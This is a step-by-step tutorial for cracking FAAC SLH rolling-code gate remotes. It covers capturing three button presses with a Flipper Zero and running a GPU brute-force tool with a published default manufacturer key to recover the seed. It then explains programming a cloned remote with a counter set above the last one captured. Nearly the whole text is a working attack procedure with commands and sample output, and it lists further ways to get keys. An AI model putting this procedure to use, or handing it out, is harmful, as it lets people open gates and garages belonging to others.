# FAAC SLH Brute-Force Tutorial

This guide walks you through capturing frames from a FAAC SLH remote and recovering its seed.

## Why You Need 3 Consecutive Presses

For a **unique seed** (100% confidence), you need **3 frames from the same button** pressed one after another:

| Frames | Same button? | Candidates | Confidence |
|--------|-------------|-----------|------------|
| 3+     | Same button | **1**     | **100%** |
| 2      | Same button | ~1,000    | Sorted by gap (top candidate often >80%) |
| 2      | Different   | ~1,000    | Unsorted |
| 1      | —           | ~1M       | Useless alone |

The counters increment with each press (e.g., 0x0A, 0x0B, 0x0C). Three consecutive presses give enough bits to pin down a single seed.

**For fastest and most reliable results: press the same button 3+ times in a row.**

## Step 1: Capture Frames with Flipper Zero

1. Open **Sub-GHz → Read** on your Flipper
2. Set frequency to **868.35 MHz** (or 433.92 MHz) and modulation **AM650**
3. Stand near the remote (~1-2 meters)
4. **Press the same button 3+ times** in quick succession — like you're opening a gate
5. You should see signals appear on screen

Each saved file will contain a 64-bit frame like:

```
Key: A0 CE 0C 75 E0 B6 41 19
```

## Step 2: Extract the Hex Frames

Open each captured signals and find the `Key:` line. The 16 hex digits are your frame.

From it, extract just the hex values:

```
A0CE0C75E0B64119
A0CE0C75AB79166A
A0CE0C75A23D4DDB
```

All three should have the same first 8 hex digits (same serial + button) if you pressed the same button.

## Step 3: Verify Your Captures

Check that frames make sense:

```
Fix=0xA0CE0C75 Hop=0xE0B64119 Sn=A0CE0C7 Btn=5
Fix=0xA0CE0C75 Hop=0xAB79166A Sn=A0CE0C7 Btn=5
Fix=0xA0CE0C75 Hop=0xA23D4DDB Sn=A0CE0C7 Btn=5
```

- Same `Sn` (serial) across all frames — good sign
- Same `Btn` — essential for gap-sorting to work
- Different `Hop` — shows the rolling code changed (expected)

If `Sn` shows as `Unknown` or `Sd:Unknown`, don't worry — that just means the firmware doesn't have the right key to decode it. That's why we're brute-forcing.

## Step 4: Run the Brute-Force

With 3 same-button frames:

```bash
./faac_gpu 53696C7669618C14 <Frame1Key> <Frame2Key> <Frame2Key>
```
** Note: 53696C7669618C14 is the default manufacture key for Faac SLH, should work for most remote. **

Example:

```bash
./faac_gpu 53696C7669618C14 A0CE0C75E0B64119 A0CE0C75AB79166A A0CE0C75A23D4DDB
```

The tool will search all 4 billion possible seeds. With a GPU this takes ~2-4 minutes.

### With only 2 frames

If you only have 2 same-button captures, you'll get ~1,000 candidates. The tool sorts them by counter gap:

```bash
./faac_gpu 53696C7669618C14 A0CE0C75E0B64119 A0CE0C75AB79166A
```

Output:
```
Top 50 / 1027 candidates (sorted by gap):
   1: SEED=0x59982457 gap=1 (87.26%)
   2: SEED=0x64D62230 gap=890 (1.07%)
   ...
```

The #1 candidate with gap=1 (counters 0x0A → 0x0B) is almost certainly correct at 87%. The next candidate is at 1% — a massive drop.

## Step 5: Interpret the Results

### Success: Seed Found

```
*** SEED = 0x113B1838 *** (100% confidence, 201.08 seconds)
  Frame 1: decrypt=0x75C000B8 cnt=000B8
  Frame 2: decrypt=0xCE0000B9 cnt=000B9
  Frame 3: decrypt=0xD1B00C8A cnt=00C8A
```

The counters (0x0B8 → 0x0B9 → 0xC8A) should increment. (Frame 3 has a different button, hence different counter space.)

Now you can use this seed in Flipper Zero:

1. **Sub-GHz → Add Manually → FAAC SLH**
2. Enter the serial from your captures
3. Enter the seed
4. Set counter to a value slightly above the last captured counter
5. Save and send

### Failure: No Candidates

```
Found 0 candidates
No candidates found. Wrong mfkey or protocol?
```

Your installation uses a **different manufacturer key**. The standard key `53696C7669618C14` only works for some FAAC installations. Your remote was likely paired under a batch-specific key.

Options:
- **Capture from a known-working remote** (one that validates with the standard key)
- **Get the mfkey from the receiver** during a fresh pairing (requires physical access)
- **Try other known FAAC SLH keys** if you have them
